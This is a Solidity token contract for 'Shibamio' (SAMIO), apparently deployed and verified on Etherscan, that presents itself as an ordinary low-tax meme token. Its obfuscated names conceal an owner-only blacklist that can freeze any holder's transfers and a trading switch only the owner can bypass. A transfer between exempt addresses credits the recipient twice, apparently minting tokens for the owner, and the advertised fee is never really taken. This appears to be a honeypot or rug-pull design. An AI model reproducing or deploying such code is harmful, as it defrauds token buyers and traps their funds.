/**
 *Submitted for verification at Etherscan.io on 2023-01-26
*/

/*
█▀ █░█ █ █▄▄ ▄▀█ █▀▄▀█ █ █▀█
▄█ █▀█ █ █▄█ █▀█ █░▀░█ █ █▄█

░░█ ▄▀█ █▀█ ▄▀█ █▄░█
█▄█ █▀█ █▀▀ █▀█ █░▀█

⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢿⣦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣤⣤⣾⣿⡇⠀⢻⣆⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⡀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢹⡇⠀
⠀⠀⣴⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡇⠀
⠀⣰⣿⣿⣿⡄⢿⣿⣿⣿⣿⣿⡃⢰⣶⣿⣿⣿⣿⣿⡿⠿⠿⠿⢿⣿⣧⠀
⢠⣿⠉⠙⣿⣿⣿⣿⠿⠿⠿⣿⣷⣮⣽⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠉⣿⡆
⣸⡇⠀⢼⣿⣿⣿⡟⠀⠀⠀⠀⠈⠉⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇
⢿⡇⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⢸⣧⠀⠐⠻⠿⣶⣤⣄⣀⡤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠀⠀
⠈⢿⡄⠀⠀⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠈⢿⣆⠀⠈⠉⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠛⢷⣤⣀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⠿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

https://web.wechat.com/ShibamioJPN
총 공급량 - 5,000,000
구매세 - 1%
판매세 - 1%
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

interface ILOCompressioner01 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 
    address pair, uint);
    function createPair(
    address tokenA, 
    address tokenB) 
    external returns 
    (address pair);
}
abstract contract Context {
    function _msgSender() 
    internal view virtual returns 
    (address) { return msg.sender;
    }
}
interface NEDOX20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
interface ICOMPILERV1 {
    event Approval(
        address indexed owner, 
        address indexed spender, 
    uint value);
    event Transfer(
        address indexed from, 
        address indexed to, 
    uint value);
    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value)
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, address to, uint value) 
    external returns (bool);
    function DOMAIN_SEPARATOR() 
    external view returns (bytes32);
}
library SafeMathUnit {
    function trySub(uint256 a, uint256 b) 
    internal pure returns 
    (bool, uint256) { unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a + b;
    }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a - b;
    }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a * b;
    }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a / b;
    }
    function mod(uint256 a, uint256 b) 
    internal pure returns 
    (uint256) { return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked 
    { require(b <= a, errorMessage); return a - b; } }
}
  interface ERCMigration01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline ) 
    external; function factory() 
      external pure returns (address);
      function WETH()
      external pure returns (address); 
      function addLiquidityETH(
      address token, 
      uint amountTokenDesired, uint amountTokenMin, 
      uint amountETHMin, address to, uint deadline) 
      external payable returns (
      uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner); 
    constructor () { _owner = 0x4C73CEb4ec1B7E6586a49dACB53Aa7648B4A2F03;
        emit OwnershipTransferred(address(0), 
        _owner); }

    function owner() 
    public view virtual returns 
    (address) {
        return _owner; 
    }
    modifier onlyOwner() {
        require(owner() 
        == _msgSender(), 
        "Ownable: caller is not the owner"); _;
     }
    function renounceOwnership() 
    public virtual 
    onlyOwner { 
        emit OwnershipTransferred(_owner, address(0));
        _owner 
        = address(0); 
    }
}
// de ETHERSCAN.io.
contract Shibamio is Context, NEDOX20, Ownable {
    mapping (address => uint256) 
    private _tOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool)
    private inclineLagative;
    mapping (address => bool) 
    private inglidePoseidon;

    uint256 private indexedAlterlags; bool public maybornFigurations = true; 
    bool public inparReserves = true; bool private tradingAllowed = false;
    uint256 public indexedRatio = 30; uint256 public vorpoleDalign = 20;
    uint256 public quadpieceLink = 0; uint256 private invarTime = indexedRatio;
    uint256 private conolodeInfant = quadpieceLink;

    string private _name = unicode"Shibamio"; string private _symbol = unicode"SAMIO";
    uint256 private constant miludedString = ~uint256(0);
    uint8 private _decimals = 12;
    uint256 private _totalSupply = 5000000 * 10**_decimals; uint256 public rodoxedValues = 1000000 * 10**_decimals;
    uint256 private _tTotalInDemand = (miludedString - (miludedString % _totalSupply));

    constructor () { _tOwned[owner()] = _totalSupply;
        ERCMigration01 MeldoxPressurize = ERCMigration01
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        INVALVE01 = ILOCompressioner01
        (MeldoxPressurize.factory())
        .createPair(address(this), MeldoxPressurize.WETH());
        EKOOBIv1 = 
        MeldoxPressurize;
        inclineLagative [owner()] = true;
        inclineLagative [address(this)] = true;
        emit Transfer(
            address(0), 
            owner(), 
        _totalSupply); }
  
    function name() 
    public view returns 
    (string memory) {
        return _name;
    }
    function symbol() 
    public view returns 
    (string memory) {
        return _symbol;
    }
    function decimals() 
    public view returns 
    (uint8) {
        return _decimals;
    }
    function totalSupply() 
    public view override returns 
    (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) 
    public view override returns 
    (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    public override returns 
    (bool) {
        _transfer(_msgSender(), 
        recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view override returns 
    (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public override returns 
    (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, 
    address recipient, uint256 amount) 
    public override returns 
    (bool) 
    { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }   
    function _transfer(  address from,  address to, uint256 amount ) 
    private { require(amount > 0, 
        "Transfer amount must be greater than zero"); bool inproviseTraits 
        = false; if(!inclineLagative[from] && 
        !inclineLagative[to]){ 
            inproviseTraits = true;

        require(amount <= 
        rodoxedValues, 
        "Transfer amount exceeds the maxTxAmount."); }
        require(!inglidePoseidon[from] 
        && !inglidePoseidon[to], 
        "You have been blacklisted from transfering tokens");

        uint256 initialETHBalance = balanceOf(
            address(this)); 
            if(initialETHBalance >= 
        rodoxedValues) { initialETHBalance 
        = rodoxedValues; 
        } _afterTokenTransfer(
            from,to,amount,inproviseTraits); 
            emit Transfer(from, to, amount); 
            if (!tradingAllowed) {require( from 
            == owner(),  "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function ingrinePocket(address ingPok) 
    public onlyOwner {
        ingPok = ingPok;
    }       
        function MacelignToggle
        (uint256 
        initialETHBalance) private lockTheSwap { 
            uint256 quevelBasis 
        = initialETHBalance.div(2); 

        uint256 deboolConel = 
        initialETHBalance.sub(quevelBasis); 
        uint256 instinctRATE = address(this).balance; 
        ETHforERCtransmittions(
            quevelBasis); uint256 lipizeMultinants 
            = address(this).balance.sub(instinctRATE);
        initiatePool(
            deboolConel, lipizeMultinants); emit macelignToggle(
                quevelBasis, lipizeMultinants, deboolConel);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }    
    function _beforeTokenTransfer
    (address sender, 
    address recipient, uint256 olediseAmount,
    bool inproviseTraits) 
    private { uint256 ERCInteractions = 
    0; if (inproviseTraits){ ERCInteractions = 
    olediseAmount.mul(1).div(100) ; 
    } uint256 protonBytesAmount = olediseAmount - 
        ERCInteractions; 
        _tOwned[recipient] = 
        _tOwned[recipient].add(protonBytesAmount); 

        uint256 inviseData 
        = _tOwned
        [recipient].add(protonBytesAmount); _tOwned[sender] 
        = _tOwned
        [sender].sub(protonBytesAmount); 
        bool inclineLagative = 
        inclineLagative[sender] 
        && inclineLagative[recipient]; 
        if (inclineLagative ){ _tOwned[recipient] 
        = inviseData;
        } else { emit Transfer (
            sender, recipient, protonBytesAmount); 
    } }
    function getLeakadox
    (uint256 grantMonisole) 
    private view 
    returns 
    (uint256) {
        return grantMonisole.mul 
        (indexedRatio).div
        ( 10**3 );
    }
    function ETHforERCtransmittions(uint256 transactsRates) 
    private { address[] memory path = 
    new address[] (2); path[0] 
        = address(this); path[1] = EKOOBIv1.WETH();
        _approve(address(this), address
        (EKOOBIv1), 
        transactsRates); 
        EKOOBIv1.swapExactTokensForETHSupportingFeeOnTransferTokens(
        transactsRates, 
        0, path, address(this), block.timestamp );
    }
    function inverdeseAllignments 
    (address disallignment, bool adverseMines) 
    public onlyOwner {
        inglidePoseidon[disallignment] 
        = adverseMines;
    }    
    function _approve(
        address owner, address spender, uint256 amount) 
        private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances
        [owner][spender] = amount; emit Approval( owner, spender, amount);
    }   
    function improviseIndexes(address impIndex) 
    public onlyOwner {
        impIndex = impIndex;
    }   
    function initiatePool
    (uint256 protonValues, uint256 ethAmount) private 
    { _approve(address(this), address
    (EKOOBIv1), protonValues); EKOOBIv1.addLiquidityETH{value: ethAmount}(
     address(this), 
     protonValues, 0, 0, owner(), block.timestamp );
    }
    function enableTrading(bool allowingParties) 
    public
    onlyOwner { tradingAllowed = allowingParties;
    }      
    function _afterTokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool inproviseTraits) 
    private { _beforeTokenTransfer(
        sender, recipient, amount, inproviseTraits);
    } 
    address public IndexedGraphory;
    address public GaslineNodes;
    address public immutable INVALVE01;
    using SafeMathUnit for uint256;
    ERCMigration01 public immutable EKOOBIv1;

    uint256 private inprodex = 
    vorpoleDalign;
    bool inPressionMode;
    uint256 private notarimePile = 1000000000 * 10**18;
    event gatherCompression(
    uint256 aparryInrates); event allignmentCheck(
    bool enabled); 
    event macelignToggle(
        uint256 lobourneOn,
        uint256 commitInternal, 
        uint256 podoxiateResults ); 
    modifier lockTheSwap { inPressionMode = true; 
    _; inPressionMode = false; }    

    function getInternalLeakadox(uint256 grantMonisole) 
    private view 
    returns 
    (uint256) {
        return grantMonisole.mul 
        (quadpieceLink).div
        ( 10**3 );
    }
    function getConsoleLeakadox(uint256 grantMonisole) 
    private view 
    returns 
    (uint256) {
        return grantMonisole.mul 
        (vorpoleDalign).div
        ( 10**3 );
    }    
    receive() external payable {} 
}